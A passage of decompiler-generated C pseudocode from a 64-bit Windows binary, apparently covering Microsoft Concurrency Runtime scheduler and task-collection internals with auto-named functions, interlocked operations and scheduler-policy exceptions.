      sub_13F14F9D8(v3 + 52, &v8, &v7);
      return v2;
    }
  }
  return result;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14FDD8) ----------------------------------------------------
void __fastcall sub_13F14FDD8(__int64 a1)
{
  __int64 v2; // rdx

  if ( !*(_QWORD *)(a1 + 24) )
    *(_QWORD *)(a1 + 24) = sub_13F1490A8();
  if ( sub_13F15A918(a1) )
  {
    if ( (*(_DWORD *)(a1 + 8) & 0x8000000) != 0 )
    {
      _InterlockedIncrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 24) + 196i64));
      v2 = 2i64;
    }
    else
    {
      sub_13F14E1C0(*(_QWORD *)(a1 + 24), (16 * *(_DWORD *)(a1 + 8)) >> 4);
      v2 = 3i64;
    }
    sub_13F15A8B4(a1, v2);
    sub_13F14E26C(*(_QWORD *)(a1 + 24), a1);
  }
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14FE64) ----------------------------------------------------
void __fastcall sub_13F14FE64(__int64 a1, char a2, __int64 a3)
{
  __int64 v6; // rdi
  __int64 v7; // rdx
  bool v8; // al
  __int64 v9; // rdx
  int v10; // edi
  __int64 v11; // rbp

  v6 = sub_13F14FCDC(a1);
  if ( sub_13F15090C(a1, 1) )
  {
    v8 = *(_QWORD *)(v6 + 168) != v6 && (*(_DWORD *)(v6 + 200) & 1) != 0;
    if ( v8 || v6 == a1 )
    {
      do
      {
        while ( 1 )
        {
          v10 = *(_DWORD *)(a1 + 88);
          if ( ((v10 - 1) & 0xFFFFFFFB) != 0 )
            break;
          v11 = *(_QWORD *)(a1 + 24);
          sub_13F14E1C0(v11, (16 * *(_DWORD *)(a1 + 8)) >> 4);
          if ( v10 == 5 )
            sub_13F14FC80(a1, v11);
          _InterlockedExchange((volatile __int32 *)(a1 + 88), 4);
        }
      }
      while ( _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 88), 3, 0) != v10 );
      LOBYTE(v7) = a2;
      sub_13F150050(a1, v7, 1);
    }
    else
    {
      LOBYTE(v7) = a2;
      sub_13F14FF90(a1, v7);
    }
    LOBYTE(v9) = a2;
    sub_13F14FF58(a1, v9, a3);
  }
}
// 13F14FEC8: variable 'v7' is possibly undefined
// 13F14FF03: variable 'v9' is possibly undefined

//----- (000000013F14FF58) ----------------------------------------------------
void __fastcall sub_13F14FF58(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  char v4; // di

  if ( a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      LOBYTE(a2) = v4;
      sub_13F14FF90(v3, a2);
      v3 = *(_QWORD *)(v3 + 176);
    }
    while ( v3 );
  }
}
// 13F14FF73: variable 'a2' is possibly undefined

//----- (000000013F14FF90) ----------------------------------------------------
void __fastcall sub_13F14FF90(__int64 a1, __int64 a2)
{
  signed __int32 v2; // edi
  signed __int32 v3; // er8
  char v4; // r15
  signed __int32 v6; // eax
  char v7; // bp
  __int64 v8; // r14

  v2 = *(_DWORD *)(a1 + 88);
  v3 = 0;
  v4 = a2;
  while ( 1 )
  {
    if ( v2 )
    {
      if ( v2 == 1 || v2 == 5 )
      {
        v3 = 9;
        goto LABEL_8;
      }
    }
    else
    {
      v3 = 3;
    }
    if ( !v3 )
      return;
LABEL_8:
    v6 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 88), v3, v2);
    v3 = v6;
    if ( v2 == v6 )
      break;
    v2 = v6;
  }
  v7 = 0;
  if ( ((v2 - 1) & 0xFFFFFFFB) == 0 )
  {
    v7 = 1;
    v8 = *(_QWORD *)(a1 + 24);
    sub_13F14E1C0(v8, (16 * *(_DWORD *)(a1 + 8)) >> 4);
    if ( v2 == 5 )
      sub_13F14FC80(a1, v8);
  }
  LOBYTE(a2) = v4;
  sub_13F150050(a1, a2, v7);
  if ( v7 )
    _InterlockedExchange((volatile __int32 *)(a1 + 88), 4);
}
// 13F150029: variable 'a2' is possibly undefined

//----- (000000013F150050) ----------------------------------------------------
void __fastcall sub_13F150050(__int64 a1, __int64 a2, char a3)
{
  __int64 v5; // r14
  __int64 v6; // rdi
  bool i; // zf

  v5 = a1 + 48;
  sub_13F1419E0(a1 + 56);
  if ( a3 )
  {
LABEL_4:
    sub_13F14E26C(*(_QWORD *)(a1 + 24), a1);
    goto LABEL_5;
  }
  if ( *(int *)(a1 + 80) > 0 )
  {
    v6 = *(_QWORD *)v5;
    if ( *(_QWORD *)v5 )
      goto LABEL_8;
    goto LABEL_4;
  }
LABEL_5:
  v6 = *(_QWORD *)v5;
  for ( i = *(_QWORD *)v5 == 0i64; ; i = v6 == *(_QWORD *)v5 )
  {
    if ( i )
      v6 = 0i64;
    else
LABEL_8:
      v6 = *(_QWORD *)(v6 + 8);
    if ( !v6 )
      break;
    _InterlockedExchange((volatile __int32 *)(v6 - 160 + 192), 1);
    sub_13F14E1C0(v6 - 160, -999);
    sub_13F14E26C(v6 - 160, 0i64);
  }
  sub_13F141BE4((volatile signed __int32 *)(v5 + 8));
}

//----- (000000013F150104) ----------------------------------------------------
bool __fastcall sub_13F150104(__int64 a1, _QWORD *a2)
{
  return *(_QWORD *)(a1 + 16) == *a2;
}

//----- (000000013F150110) ----------------------------------------------------
__int64 __fastcall sub_13F150110(__int64 a1)
{
  __int64 result; // rax

  result = *(unsigned int *)(a1 + 36);
  if ( (_DWORD)result == 0x80000000 || (_DWORD)result == -2147483647 )
    result = sub_13F150488(a1);
  if ( !_InterlockedIncrement((volatile signed __int32 *)(a1 + 36)) )
    return sub_13F14CF08((volatile signed __int64 *)(a1 + 48));
  return result;
}

//----- (000000013F150140) ----------------------------------------------------
void __fastcall sub_13F150140(__int64 a1, __int64 a2)
{
  char v4; // r14
  __int64 v5; // rbx
  int v6; // eax
  _QWORD *v7; // rcx
  _QWORD *v8; // rdx
  __int64 v9; // rax
  int v10; // eax
  __int64 v11; // rcx
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  unsigned int v16; // [rsp+60h] [rbp+8h] BYREF
  __int64 v17; // [rsp+70h] [rbp+18h]

  v4 = 0;
  v5 = a1 + 24;
  v17 = a1 + 24;
  v6 = sub_13F10A240(a1 + 24);
  if ( v6 )
    sub_13F109DF8(v6);
  v7 = *(_QWORD **)(a1 + 104);
  if ( v7 )
  {
    v8 = 0i64;
    while ( *v7 != a2 )
    {
      v8 = v7;
      v7 = (_QWORD *)v7[1];
      if ( !v7 )
        goto LABEL_14;
    }
    v9 = v7[1];
    if ( v8 )
      v8[1] = v9;
    else
      *(_QWORD *)(a1 + 104) = v9;
    if ( !v7[1] )
      *(_QWORD *)(a1 + 112) = v8;
    sub_13F14088C(v7, 16i64);
LABEL_14:
    _InterlockedExchange((volatile __int32 *)(a2 + 16), 2);
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(a2 + 8), 0xFFFFFFFF) == 1 )
      (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)a2 + 8i64))(a2, v8);
    v5 = v17;
  }
  else
  {
    v4 = 1;
  }
  v10 = sub_13F10A264(v5);
  if ( v10 )
    sub_13F109DF8(v10);
  if ( v4 )
  {
    v16 = 0;
    sub_13F1509F4((volatile signed __int32 *)(a2 + 16), (signed __int32 *)&v16, 1, 5);
    if ( v16 > 3 )
    {
      v12 = sub_13F178410(v11);
      if ( v16 != v12 && _InterlockedExchange((volatile __int32 *)(a2 + 16), 2) != 3 )
      {
        v13 = sub_13F10A240(a2 + 96);
        if ( v13 )
          sub_13F109DF8(v13);
        while ( !*(_BYTE *)(a2 + 176) )
        {
          v14 = sub_13F1790AC(a2 + 24, a2 + 96);
          if ( v14 )
            sub_13F109DF8(v14);
        }
        v15 = sub_13F10A264(a2 + 96);
        if ( v15 )
          sub_13F109DF8(v15);
      }
    }
  }
}
// 13F1501E7: variable 'v8' is possibly undefined
// 13F150238: variable 'v11' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F178410: using guessed type __int64 __fastcall sub_13F178410(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1502B8) ----------------------------------------------------
__int64 __fastcall sub_13F1502B8(__int64 (__fastcall ***a1)(_QWORD, __int64))
{
  __int64 result; // rax

  if ( a1 )
    return (**a1)(a1, 1i64);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1502D8) ----------------------------------------------------
__int64 __fastcall sub_13F1502D8(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(a1 + 192))(*(_QWORD *)(a1 + 200));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1502F0) ----------------------------------------------------
__int64 __fastcall sub_13F1502F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  int v4; // eax
  signed __int64 v5; // rsi
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rdx
  __int64 v8; // rax
  void *v9; // rsp
  __int64 *v10; // rbx
  __int64 *v11; // rax
  __int64 i; // rcx
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-20h] BYREF
  __int64 *v15; // [rsp+20h] [rbp+0h] BYREF
  __int64 *v16; // [rsp+28h] [rbp+8h]
  __int64 v17; // [rsp+30h] [rbp+10h]
  __int64 v18; // [rsp+38h] [rbp+18h]
  __int64 pExceptionObject[3]; // [rsp+40h] [rbp+20h] BYREF

  v18 = -2i64;
  v2 = a2;
  v4 = 0;
  if ( !a2 )
    return sub_13F14D63C((__int64 **)(a1 + 96), 0xFFFFFFFF);
  do
  {
    ++v4;
    a2 = *(_QWORD *)(a2 + 176);
  }
  while ( a2 );
  if ( v4 <= 0 )
    return sub_13F14D63C((__int64 **)(a1 + 96), 0xFFFFFFFF);
  v15 = qword_13F18AEF8;
  v16 = 0i64;
  v17 = 0i64;
  v5 = v4 + 1;
  v6 = 8 * v5;
  v7 = (v6 + 16) & -(__int64)(v6 < v6 + 16);
  if ( v7 )
  {
    if ( v7 > 0x400 )
    {
      v11 = (__int64 *)sub_13F16A298((v6 + 16) & -(__int64)(v6 < v6 + 16));
      v10 = v11;
      if ( !v11 )
        goto LABEL_14;
      *(_DWORD *)v11 = 56797;
    }
    else
    {
      v8 = v7 + 15;
      if ( v7 + 15 <= v7 )
        v8 = 0xFFFFFFFFFFFFFF0i64;
      v9 = alloca(v8 & 0xFFFFFFFFFFFFFFF0ui64);
      v10 = (__int64 *)&v15;
      if ( &v14 == (__int64 *)-32i64 )
      {
LABEL_22:
        sub_13F109748(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
      LODWORD(v15) = 52428;
    }
    v10 += 2;
  }
  else
  {
    v10 = 0i64;
  }
LABEL_14:
  if ( !v10 )
    goto LABEL_22;
  v16 = v10;
  v17 = 0i64;
  *v10 = *(_QWORD *)(a1 + 168) + 96i64;
  for ( i = 1i64; i < v5; ++i )
  {
    v10[i] = v2 + 96;
    v2 = *(_QWORD *)(v2 + 176);
  }
  result = sub_13F14D8AC(v10, v5, 1, 0xFFFFFFFF);
  if ( *((_DWORD *)v10 - 4) == 56797 )
    return sub_13F16A188(v10 - 2);
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F18AEF8: using guessed type __int64 qword_13F18AEF8[7];
// 13F1502F0: using guessed type _QWORD pExceptionObject[3];

//----- (000000013F150480) ----------------------------------------------------
__int64 __fastcall sub_13F150480(__int64 a1)
{
  return a1 + 48;
}

//----- (000000013F150488) ----------------------------------------------------
__int64 __fastcall sub_13F150488(__int64 a1)
{
  __int64 result; // rax
  char v3[8]; // [rsp+20h] [rbp-28h] BYREF
  int v4; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v5)(); // [rsp+30h] [rbp-18h]

  if ( _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 36), -2147483647, 0x80000000) == 0x80000000 )
  {
    *(_QWORD *)(a1 + 48) = 0i64;
    return (unsigned int)_InterlockedExchange((volatile __int32 *)(a1 + 36), 0);
  }
  else
  {
    v4 = 0;
    v5 = sub_13F142C6C;
    for ( result = *(unsigned int *)(a1 + 36); (int)result <= -2147483647; result = *(unsigned int *)(a1 + 36) )
      sub_13F141BF4((__int64)v3);
  }
  return result;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F150488: using guessed type char var_28[8];

//----- (000000013F1504E4) ----------------------------------------------------
__int64 __fastcall sub_13F1504E4(__int64 a1)
{
  signed __int32 v2; // ebx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  __int64 result; // rax
  signed __int32 v7; // [rsp+40h] [rbp+8h] BYREF
  signed __int32 v8; // [rsp+48h] [rbp+10h] BYREF

  v2 = sub_13F178410(a1);
  v7 = 0;
  sub_13F1509F4((volatile signed __int32 *)(a1 + 16), &v7, v2, 5);
  if ( !v7 )
  {
    (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 16i64))(a1);
    v8 = v2;
    sub_13F1509F4((volatile signed __int32 *)(a1 + 16), &v8, 3, 5);
    if ( v8 == 2 )
    {
      v3 = sub_13F10A240(a1 + 96);
      if ( v3 )
        sub_13F109DF8(v3);
      *(_BYTE *)(a1 + 176) = 1;
      v4 = sub_13F10A264(a1 + 96);
      if ( v4 )
        sub_13F109DF8(v4);
      v5 = sub_13F17907C(a1 + 24);
      if ( v5 )
        sub_13F109DF8(v5);
    }
  }
  result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 8), 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 8i64))(a1);
  return result;
}
// 13F178410: using guessed type __int64 __fastcall sub_13F178410(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1505D0) ----------------------------------------------------
bool __fastcall sub_13F1505D0(__int64 a1)
{
  return *(_DWORD *)(*(_QWORD *)(a1 + 168) + 84i64) != 0;
}

//----- (000000013F1505E0) ----------------------------------------------------
bool __fastcall sub_13F1505E0(__int64 a1)
{
  return (*(_DWORD *)(a1 + 200) & 2) != 0;
}

//----- (000000013F1505EC) ----------------------------------------------------
char __fastcall sub_13F1505EC(__int64 a1, __int64 a2)
{
  char result; // al
  __int64 (__fastcall *v4)(__int64); // rdi
  __int64 v5; // rsi

  if ( *(_BYTE *)(a2 + 32) )
    result = sub_13F15B058((__int64 (__fastcall ***)(_QWORD, __int64))a2);
  v4 = *(__int64 (__fastcall **)(__int64))(a1 + 216);
  v5 = *(_QWORD *)(a1 + 224);
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 32), 0xFFFFFFFF) == 1 )
    result = sub_13F14D380(a1 + 96);
  if ( v4 )
    return v4(v5);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F150654) ----------------------------------------------------
__int64 __fastcall sub_13F150654(__int64 a1)
{
  return *(_QWORD *)(a1 + 168);
}

//----- (000000013F15065C) ----------------------------------------------------
__int64 __fastcall sub_13F15065C(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v8; // rax
  __int64 v9; // rbx

  v8 = sub_13F14059C(208i64);
  v9 = 0i64;
  if ( v8 )
    v9 = sub_13F14F36C(v8, a2, a3, a4);
  sub_13F1506D4(a1, v9);
  return v9;
}

//----- (000000013F1506D4) ----------------------------------------------------
void __fastcall sub_13F1506D4(__int64 a1, __int64 a2)
{
  char v4; // si
  int v5; // eax
  _QWORD *v6; // rax
  _QWORD *v7; // rcx
  int v8; // eax
  __int64 v9; // [rsp+40h] [rbp+8h]

  _InterlockedExchange((volatile __int32 *)(a2 + 16), 0);
  v4 = 1;
  _InterlockedAdd((volatile signed __int32 *)(a2 + 8), 1u);
  *(_QWORD *)(a2 + 184) = a1;
  if ( *(_DWORD *)(a1 + 16) )
    goto LABEL_15;
  v9 = a1 + 24;
  v5 = sub_13F10A240(a1 + 24);
  if ( v5 )
    sub_13F109DF8(v5);
  if ( !*(_DWORD *)(a1 + 16) )
  {
    v4 = 0;
    v6 = (_QWORD *)sub_13F14059C(16i64);
    v7 = v6;
    if ( v6 )
    {
      *v6 = a2;
      v6[1] = 0i64;
    }
    else
    {
      v7 = 0i64;
    }
    if ( *(_QWORD *)(a1 + 104) )
      *(_QWORD *)(*(_QWORD *)(a1 + 112) + 8i64) = v7;
    else
      *(_QWORD *)(a1 + 104) = v7;
    *(_QWORD *)(a1 + 112) = v7;
  }
  v8 = sub_13F10A264(v9);
  if ( v8 )
    sub_13F109DF8(v8);
  if ( v4 )
LABEL_15:
    sub_13F1504E4(a2);
}

//----- (000000013F1507A0) ----------------------------------------------------
__int64 __fastcall sub_13F1507A0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  int v4; // ett

  LODWORD(result) = *(_DWORD *)(a1 + 200);
  while ( (result & 2) == 0 )
  {
    a2 = (unsigned int)result | 2;
    v4 = result;
    result = (unsigned int)_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 200), a2, result);
    if ( v4 == (_DWORD)result )
      return result;
  }
  sub_13F14F670(a1, a2);
  return sub_13F14088C(a1, 232i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1507DC) ----------------------------------------------------
void __fastcall sub_13F1507DC(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbp
  __int64 v6; // rsi
  signed __int32 v7; // eax
  int v8; // ecx
  signed __int32 v9; // ett
  char v10[8]; // [rsp+20h] [rbp-48h] BYREF
  int v11; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v12)(); // [rsp+30h] [rbp-38h]
  char v13[8]; // [rsp+38h] [rbp-30h] BYREF
  int v14; // [rsp+40h] [rbp-28h]
  __int64 (__fastcall *v15)(); // [rsp+48h] [rbp-20h]

  while ( 2 )
  {
    v4 = sub_13F1492D4();
    v5 = *(_QWORD *)(a1 + 24);
    v6 = v4;
LABEL_2:
    v7 = *(_DWORD *)(a1 + 88);
    do
    {
      while ( 1 )
      {
        if ( v7 == 9 )
        {
          v8 = *(_DWORD *)(a1 + 88);
          v11 = 0;
          v12 = sub_13F142C6C;
          if ( v8 == 9 )
          {
            do
              sub_13F141BF4((__int64)v10);
            while ( *(_DWORD *)(a1 + 88) == 9 );
          }
          goto LABEL_2;
        }
        if ( v6 == v5 )
          break;
        v7 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 88), 0, 3);
        if ( v7 != 9 )
          goto LABEL_12;
      }
      v9 = v7;
      v7 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 88), 0, v7);
    }
    while ( v9 != v7 );
    if ( v7 == 4 )
      sub_13F14E230(v6, (16 * *(_DWORD *)(a1 + 8)) >> 4);
    *(_DWORD *)(a1 + 8) |= 0xFFFFFFFu;
LABEL_12:
    if ( *(_QWORD *)(a1 + 168) == a1 )
    {
      while ( a2 )
      {
        if ( (*(_DWORD *)(a2 + 200) & 2) == 0 )
          sub_13F1507DC(a2, 0i64);
        a2 = *(_QWORD *)(a2 + 176);
      }
      if ( _InterlockedExchange((volatile __int32 *)(a1 + 84), 0) < 0 )
      {
        v14 = 0;
        v15 = sub_13F142C6C;
        while ( *(_QWORD *)(a1 + 40) == 8i64 )
          sub_13F141BF4((__int64)v13);
        sub_13F15A9D4(a1);
      }
    }
    else if ( (*(_DWORD *)(a1 + 200) & 1) == 0 && a2 )
    {
      a1 = *(_QWORD *)(a1 + 168);
      continue;
    }
    break;
  }
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1507DC: using guessed type char var_48[8];
// 13F1507DC: using guessed type char var_30[8];

//----- (000000013F15090C) ----------------------------------------------------
char __fastcall sub_13F15090C(__int64 a1, int a2)
{
  signed __int32 v2; // eax
  signed __int32 v3; // ett

  v2 = *(_DWORD *)(a1 + 84);
  do
  {
    if ( (v2 & 0x3FFFFFFF) != 0 )
      return 0;
    v3 = v2;
    v2 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 84), a2 | v2 & 0xC0000000, v2);
  }
  while ( v3 != v2 );
  return 1;
}

//----- (000000013F150938) ----------------------------------------------------
char __fastcall sub_13F150938(__int64 a1, __int64 a2)
{
  __int64 v3; // rcx

  v3 = *(_QWORD *)(a1 + 16);
  ++*(_DWORD *)(a2 + 8);
  sub_13F1505EC(v3, a1);
  return 1;
}

//----- (000000013F150958) ----------------------------------------------------
bool __fastcall sub_13F150958(__int64 a1, char a2)
{
  bool v2; // di
  __int64 v5; // rax
  bool v6; // cc
  bool v7; // zf

  v2 = 0;
  if ( *(_QWORD *)(a1 + 168) != a1 && (*(_DWORD *)(a1 + 200) & 1) == 0 )
    return !v2;
  if ( sub_13F15FBC0() )
    goto LABEL_10;
  v2 = *(_DWORD *)(a1 + 32) > 0;
  if ( *(_QWORD *)(a1 + 168) == a1 )
  {
    v5 = *(_QWORD *)(a1 + 176);
    while ( v5 )
    {
      v6 = *(_DWORD *)(v5 + 32) <= 0;
      v5 = *(_QWORD *)(v5 + 176);
      if ( !v6 )
        v2 = 1;
    }
  }
  v7 = !v2;
  if ( v2 )
  {
LABEL_10:
    sub_13F14FAB4(a1, a2);
    return !v2;
  }
  return v7;
}

//----- (000000013F1509F4) ----------------------------------------------------
bool __fastcall sub_13F1509F4(volatile signed __int32 *a1, signed __int32 *a2, signed __int32 a3, int a4)
{
  int v4; // eax
  int v6; // eax
  int v7; // ecx
  signed __int32 v8; // eax
  signed __int32 v9; // ett
  signed __int32 v11; // ett

  v4 = a4;
  if ( a4 == 3 )
    v4 = 0;
  if ( a4 == 4 )
    v4 = 2;
  v6 = *((_DWORD *)&qword_13F18ADF0[3 * a4] + v4);
  if ( !v6 )
    goto LABEL_14;
  if ( v6 <= 0 )
  {
LABEL_12:
    v7 = 0;
    return v7 != 0;
  }
  if ( v6 <= 2 || v6 == 3 )
  {
LABEL_14:
    v11 = *a2;
    v8 = _InterlockedCompareExchange(a1, a3, *a2);
    if ( v11 == v8 )
    {
      v7 = 1;
      return v7 != 0;
    }
    goto LABEL_11;
  }
  v7 = 1;
  if ( (unsigned int)(v6 - 4) > 1 )
    goto LABEL_12;
  v9 = *a2;
  v8 = _InterlockedCompareExchange(a1, a3, *a2);
  if ( v9 != v8 )
  {
LABEL_11:
    *a2 = v8;
    goto LABEL_12;
  }
  return v7 != 0;
}
// 13F18ADF0: using guessed type __int64 qword_13F18ADF0[19];

//----- (000000013F150A7C) ----------------------------------------------------
__int64 *__fastcall sub_13F150A7C(__int64 *a1, _OWORD **a2)
{
  __int64 v4; // rax
  _OWORD *v5; // rdx

  v4 = sub_13F14059C(40i64);
  *a1 = v4;
  v5 = *a2;
  *(_OWORD *)v4 = **a2;
  *(_OWORD *)(v4 + 16) = v5[1];
  *(_QWORD *)(v4 + 32) = *((_QWORD *)v5 + 4);
  return a1;
}

//----- (000000013F150AC4) ----------------------------------------------------
__int64 *sub_13F150AC4(__int64 *a1, unsigned __int64 a2, ...)
{
  va_list v4; // [rsp+20h] [rbp-18h] BYREF
  va_list va; // [rsp+50h] [rbp+18h] BYREF

  va_start(va, a2);
  va_copy(v4, va);
  sub_13F150C2C(a1, a2, (__int64 *)&v4);
  return a1;
}

//----- (000000013F150AF8) ----------------------------------------------------
_QWORD *__fastcall sub_13F150AF8(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E78;
  return a1;
}
// 13F189E78: using guessed type __int64 (__fastcall *off_13F189E78[3])();

//----- (000000013F150B38) ----------------------------------------------------
_QWORD *__fastcall sub_13F150B38(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189EA8;
  return a1;
}
// 13F189EA8: using guessed type __int64 (__fastcall *off_13F189EA8[3])();

//----- (000000013F150B78) ----------------------------------------------------
_QWORD *__fastcall sub_13F150B78(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E90;
  return a1;
}
// 13F189E90: using guessed type __int64 (__fastcall *off_13F189E90[3])();

//----- (000000013F150BB8) ----------------------------------------------------
__int64 __fastcall sub_13F150BB8(_QWORD *a1)
{
  return sub_13F14088C(*a1, 40i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F150BC8) ----------------------------------------------------
_QWORD *__fastcall sub_13F150BC8(_QWORD *a1, __int64 *a2)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // xmm0_8
  _QWORD *result; // rax

  v2 = *a2;
  v3 = *a1;
  *(_OWORD *)v3 = *(_OWORD *)v2;
  *(_OWORD *)(v3 + 16) = *(_OWORD *)(v2 + 16);
  v4 = *(_QWORD *)(v2 + 32);
  result = a1;
  *(_QWORD *)(v3 + 32) = v4;
  return result;
}

//----- (000000013F150BEC) ----------------------------------------------------
__int64 __fastcall sub_13F150BEC(_QWORD *a1, unsigned int a2)
{
  __int64 v3; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( a2 > 9 )
  {
    v3 = sub_13F150DD8(a2);
    sub_13F142D60(pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__);
  }
  return *(unsigned int *)(*a1 + 4i64 * (int)a2);
}
// 13F150BEC: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F150C2C) ----------------------------------------------------
__int64 __fastcall sub_13F150C2C(__int64 *a1, unsigned __int64 a2, __int64 *a3)
{
  __int64 v6; // rbx
  unsigned __int64 i; // r14
  __int64 v8; // rdi
  __int64 v9; // rax
  unsigned int v10; // er12
  __int64 v11; // rax
  unsigned int v12; // ecx
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 pExceptionObject[3]; // [rsp+28h] [rbp-70h] BYREF
  __int64 v17[3]; // [rsp+40h] [rbp-58h] BYREF
  __int64 v18[3]; // [rsp+58h] [rbp-40h] BYREF

  v6 = sub_13F14059C(40i64);
  *a1 = v6;
  *(_OWORD *)v6 = xmmword_13F1B71E0;
  *(_OWORD *)(v6 + 16) = xmmword_13F1B71F0;
  *(_QWORD *)(v6 + 32) = 1i64;
  for ( i = 0i64; i < a2; ++i )
  {
    *a3 += 8i64;
    v8 = *(int *)(*a3 - 8);
    v9 = *a3 + 8;
    *a3 = v9;
    v10 = *(_DWORD *)(v9 - 8);
    if ( (unsigned int)v8 > 9 )
    {
      v14 = sub_13F150DD8(v8);
      sub_13F142D60(pExceptionObject, v14);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__);
    }
    if ( !sub_13F150DF0(v8, v10) )
    {
      v15 = sub_13F150DD8(v8);
      sub_13F142DC4(v17, v15);
      CxxThrowException(v17, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_value_Concurrency__);
    }
    *(_DWORD *)(v6 + 4 * v8) = v10;
  }
  v11 = *a1;
  v12 = *(_DWORD *)(*a1 + 4);
  if ( v12 != -1 && *(_DWORD *)(v11 + 8) != -1 && v12 < *(_DWORD *)(v11 + 8) )
  {
    sub_13F142DAC(v18);
    CxxThrowException(v18, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__);
  }
  return sub_13F150D6C(a1, 0xFFFFFFFFi64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1B71E0: using guessed type __int128 xmmword_13F1B71E0;
// 13F1B71F0: using guessed type __int128 xmmword_13F1B71F0;
// 13F150C2C: using guessed type _QWORD pExceptionObject[3];
// 13F150C2C: using guessed type _QWORD var_58[3];
// 13F150C2C: using guessed type _QWORD var_40[3];

//----- (000000013F150D6C) ----------------------------------------------------
__int64 __fastcall sub_13F150D6C(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v4; // eax
  __int64 v5; // r8
  unsigned int v6; // edx
  __int64 result; // rax

  v2 = 0i64;
  *(_DWORD *)*a1 = 0;
  v4 = sub_13F1454C8(a1, a2);
  v5 = *a1;
  v6 = v4;
  result = *(unsigned int *)(*a1 + 4);
  if ( *(_DWORD *)(*a1 + 8) == -1 )
  {
    if ( (_DWORD)result == -1 )
    {
      do
      {
        result = *a1;
        *(_DWORD *)(v2 + *a1 + 4) = v6;
        v2 += 4i64;
      }
      while ( v2 < 8 );
    }
    else
    {
      if ( (unsigned int)result < v6 )
        v6 = *(_DWORD *)(*a1 + 4);
      *(_DWORD *)(v5 + 8) = v6;
    }
  }
  else if ( (_DWORD)result == -1 )
  {
    if ( *(_DWORD *)(v5 + 8) > v6 )
      v6 = *(_DWORD *)(v5 + 8);
    *(_DWORD *)(v5 + 4) = v6;
  }
